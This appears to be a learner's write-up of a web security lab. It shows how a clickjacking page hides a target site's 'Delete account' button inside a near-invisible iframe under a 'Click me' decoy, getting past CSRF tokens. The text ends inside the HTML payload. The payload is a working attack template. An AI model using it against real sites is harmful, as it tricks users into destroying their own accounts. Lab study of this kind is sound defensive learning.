## Overview / What I Learned

This lab demonstrates how clickjacking can be used to bypass CSRF protections when a CSRF token is implemented correctly but user interaction is not adequately protected.

Key learnings:
- Even with CSRF tokens in place, clickjacking can trick users into performing sensitive actions.
- Transparency and position-based manipulation of iframes can deceive users into clicking buttons like "Delete account."
- Real-world attackers could chain CSRF + clickjacking in the same attack scenario.

## Exploit Steps / Attack Methodology

### 1. Setup

- Logged into the lab with test credentials: `wiener:peter`
- Navigated to `/my-account` to locate the "Delete account" button.
- Verified that deleting an account requires a POST request with a valid CSRF token

### 2. Exploit Page Construction

Crafted the following HTML to embed the target page inside an iframe, and overlaid a fake button using a positioned `div`:

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
  }
</style>

<div>Click me</div>
<iframe src="https://Lab-ID.web-security-academy.net/my-account"></iframe>
